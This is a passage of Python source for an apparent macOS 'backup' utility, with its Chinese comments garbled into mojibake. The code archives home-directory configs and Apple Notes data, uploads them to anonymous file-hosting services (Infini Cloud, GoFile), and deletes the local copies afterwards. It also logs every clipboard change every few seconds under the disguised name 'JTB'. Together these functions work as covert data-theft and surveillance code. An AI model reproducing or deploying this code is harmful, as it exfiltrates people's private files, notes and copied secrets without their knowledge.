            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"ğŸ”„ å°è¯•ä½¿ç”¨ GoFile ä¸Šä¼ : {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"âœ… [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] æœåŠ¡å™¨è¿”å›é”™è¯¯ (ä»£ç : {error_code}): {error_msg}")
                                    
                                    # å¤„ç†ç‰¹å®šé”™è¯¯ç 
                                    if error_code in [402, 405]:  # æœåŠ¡å™¨é™åˆ¶æˆ–æƒé™é”™è¯¯
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # å¦‚æœå·²ç»å°è¯•äº†æ‰€æœ‰æœåŠ¡å™¨
                                            time.sleep(self.config.RETRY_DELAY * 2)  # å¢åŠ ç­‰å¾…æ—¶é—´
                            except ValueError:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error("[GoFile] æœåŠ¡å™¨è¿”å›æ— æ•ˆJSONæ•°æ®")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] ä¸Šä¼ å¤±è´¥ï¼ŒHTTPçŠ¶æ€ç : {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ è¶…æ—¶")
                except requests.exceptions.SSLError:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¿æ¥é”™è¯¯")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¯·æ±‚å¼‚å¸¸")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: æ–‡ä»¶è¯»å–é”™è¯¯")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: {str(e)}")

                # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # æ‰€æœ‰æœåŠ¡å™¨éƒ½å°è¯•è¿‡åç­‰å¾…
                
                total_retries += 1

            if upload_success:
                return True
            else:
                logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶ï¼Œä¼˜å…ˆä½¿ç”¨ Infini Cloudï¼Œå¤±è´¥åˆ™ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)
                return False

            # ä¼˜å…ˆå°è¯• Infini Cloud ä¸Šä¼ 
            if self._upload_single_file_infini(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True

            # Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
            logging.warning(f"âš ï¸ Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # ä¸¤ä¸ªæ–¹æ³•éƒ½å¤±è´¥
            logging.error(f"âŒ {os.path.basename(file_path)}: æ‰€æœ‰ä¸Šä¼ æ–¹æ³•å‡å¤±è´¥")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # ä½¿ç”¨æ›´ä¿å®ˆçš„å‹ç¼©æ¯”ä¾‹ä¼°ç®—ï¼ˆå‡è®¾å‹ç¼©åä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
            COMPRESSION_RATIO = 0.7
            # ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®ä¸ºé™åˆ¶çš„70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # å…ˆæ”¶é›†æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åº
            all_files.sort(key=lambda x: x[2], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            for file_path, _, file_size in all_files[:]:  # ä½¿ç”¨åˆ‡ç‰‡åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹åˆ—è¡¨
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"å•ä¸ªæ–‡ä»¶è¿‡å¤§: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # ä½¿ç”¨æœ€ä¼˜åŒ¹é…ç®—æ³•è¿›è¡Œåˆ†ç»„
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å½“å‰å—è¶…è¿‡é™åˆ¶ï¼Œåˆ›å»ºæ–°å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # å‹ç¼©åˆ†å—ï¼Œä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"åˆ†å— {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # æ·»åŠ æ–‡ä»¶åˆ°å½“å‰å—
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"æœ€ååˆ†å—: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.info(f"å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception:
            logging.error("åˆ†å‰²å¤±è´¥")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """å¤„ç†éƒ¨åˆ†åˆ†å—
        
        Args:
            chunk: è¦å¤„ç†çš„æ–‡ä»¶åˆ—è¡¨
            temp_dir: ä¸´æ—¶ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            compressed_files: å‹ç¼©æ–‡ä»¶åˆ—è¡¨
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"å­åˆ†å—: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """è·å–JTBå†…å®¹"""
        try:
            content = subprocess.check_output(['pbpaste']).decode('utf-8')
            if content is None:
                return None
            # å»é™¤ç©ºç™½å­—ç¬¦
            content = content.strip()
            return content if content else None
        except (subprocess.CalledProcessError, RuntimeError, UnicodeDecodeError) as e:
            logging.error(f"âŒ è·å–JTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•JTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•JTBå¤±è´¥: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§JTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºJTBæ—¥å¿—ç›®å½•å¤±è´¥: {e}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # åªæœ‰å½“JTBå†…å®¹éç©ºä¸”ä¸ä¸Šæ¬¡ä¸åŒæ—¶æ‰è®°å½•
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("ğŸ“‹ æ£€æµ‹åˆ°JTBæ›´æ–°")
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    error_count = 0  # ç©ºå†…å®¹ä¸ç®—é”™è¯¯ï¼Œé‡ç½®è®¡æ•°
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ JTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…{self.config.CLIPBOARD_ERROR_WAIT}ç§’åé‡è¯•")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ JTBç›‘æ§å‡ºé”™: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def backup_specified_files(self, source_dir, target_dir):
        """å¤‡ä»½æŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶
        
        Args:
            source_dir: æºç›®å½•è·¯å¾„
            target_dir: ç›®æ ‡ç›®å½•è·¯å¾„
            
        Returns:
            str: å¤‡ä»½ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›None
        """
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½æŒ‡å®šç›®å½•å’Œæ–‡ä»¶:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        files_count = 0
        total_size = 0
        retry_count = 3
        retry_delay = 5

        for item in self.config.MACOS_SPECIFIC_DIRS:
            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                continue

            try:
                if os.path.isdir(source_path):
                    # å¤åˆ¶ç›®å½•
                    target_path = os.path.join(target_dir, item)
                    shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                    dir_size = self._get_dir_size(target_path)
                    files_count += 1
                    total_size += dir_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {source_path} -> {target_path}")
                else:
                    # å¤åˆ¶æ–‡ä»¶
                    target_path = os.path.join(target_dir, item)
                    shutil.copy2(source_path, target_path)
                    file_size = os.path.getsize(target_path)
                    files_count += 1
                    total_size += file_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {str(e)}")

        if files_count > 0:
            logging.info(f"\nğŸ“Š æŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            return target_dir
        else:
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æŒ‡å®šæ–‡ä»¶")
            return None

    def has_clipboard_content(self, file_path):
        """æ£€æŸ¥ç²˜è´´æ¿æ–‡ä»¶æ˜¯å¦æœ‰å®é™…å†…å®¹è®°å½•
        
        Args:
            file_path: ç²˜è´´æ¿æ—¥å¿—æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦æœ‰å®é™…å†…å®¹è®°å½•
        """
        try:
            if not os.path.exists(file_path):
                return False
                
            # æ£€æŸ¥æ–‡ä»¶å¤§å°
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                return False
                
            # è¯»å–æ–‡ä»¶å†…å®¹
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
                
            if not content:
                return False
                
            # æ£€æŸ¥æ˜¯å¦åªåŒ…å«æ ‡é¢˜è¡Œï¼ˆæ²¡æœ‰å®é™…å†…å®¹ï¼‰
            lines = content.split('\n')
            actual_content_lines = []
            
            for line in lines:
                line = line.strip()
                # è·³è¿‡ç©ºè¡Œã€æ ‡é¢˜è¡Œå’Œåˆ†éš”çº¿
                if (line and 
                    not line.startswith('===') and 
                    not line.startswith('ğŸ“‹') and 
                    not line.startswith('-') * 30 and
                    not line.startswith('JTBæ—¥å¿—å·²äº') and
                    not line.startswith('JTBç›‘æ§å¯åŠ¨äº')):
                    actual_content_lines.append(line)
            
            # å¦‚æœæœ‰å®é™…å†…å®¹è¡Œï¼Œè¿”å›True
            return len(actual_content_lines) > 0
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"æ£€æŸ¥ç²˜è´´æ¿æ–‡ä»¶å†…å®¹å¤±è´¥: {e}")
            return False

def is_disk_available(disk_path):
    """æ£€æŸ¥ç£ç›˜æ˜¯å¦å¯ç”¨"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_volumes():
    """è·å–æ‰€æœ‰å¯ç”¨çš„æ•°æ®å·å’Œäº‘ç›˜ç›®å½•"""
    available_volumes = {}
    
    # è·å–ç”¨æˆ·ä¸»ç›®å½•
    user_path = os.path.expanduser('~')
    if os.path.exists(user_path):
        try:
            logging.info("æ­£åœ¨é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½...")
            logging.debug(f"ç”¨æˆ·ä¸»ç›®å½•: {user_path}")
            
            # è·å–ç”¨æˆ·åå‰ç¼€
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            
            # é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_home')
            available_volumes['home'] = {
                'docs': (os.path.abspath(user_path), os.path.join(backup_path, 'docs'), 1),
                'configs': (os.path.abspath(user_path), os.path.join(backup_path, 'configs'), 2),
                'specified': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_specified'), 4),  # ä½¿ç”¨specifiedæ›¿ä»£shell
            }
            logging.info(f"âœ… å·²é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½: {user_path}")
            
        except Exception as e:
            logging.error(f"âŒ é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½æ—¶å‡ºé”™: {e}")
    
    if not available_volumes:
        logging.warning("âš ï¸ æœªæ£€æµ‹åˆ°å¯ç”¨çš„ç”¨æˆ·ä¸»ç›®å½•")
    else:
        logging.info(f"ğŸ“Š å·²é…ç½®ç”¨æˆ·ä¸»ç›®å½•å¤‡ä»½")
        for name, config in available_volumes.items():
            logging.info(f"  - {name}: {config['docs'][0]}")
    
    return available_volumes

@lru_cache()
def get_username():
    """è·å–å½“å‰ç”¨æˆ·å"""
    return os.environ.get('USERNAME', '')

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ä¸­çš„ä¸´æ—¶æ–‡ä»¶å’Œç©ºç›®å½•"""
    try:
        if not os.path.exists(BackupConfig.BACKUP_ROOT):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        temp_dir = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_temp')
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                logging.error(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
        
        # æ¸…ç†ç©ºç›®å½•
        for root, dirs, files in os.walk(BackupConfig.BACKUP_ROOT, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # å¦‚æœç›®å½•ä¸ºç©º
                        os.rmdir(dir_path)
                except Exception:
                    continue
                    
    except Exception as e:
        logging.error(f"æ¸…ç†å¤‡ä»½ç›®å½•å¤±è´¥: {e}")

def backup_notes():
    """å¤‡ä»½Macçš„å¤‡å¿˜å½•æ•°æ®"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
    notes_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes")
    
    if not os.path.exists(notes_dir):
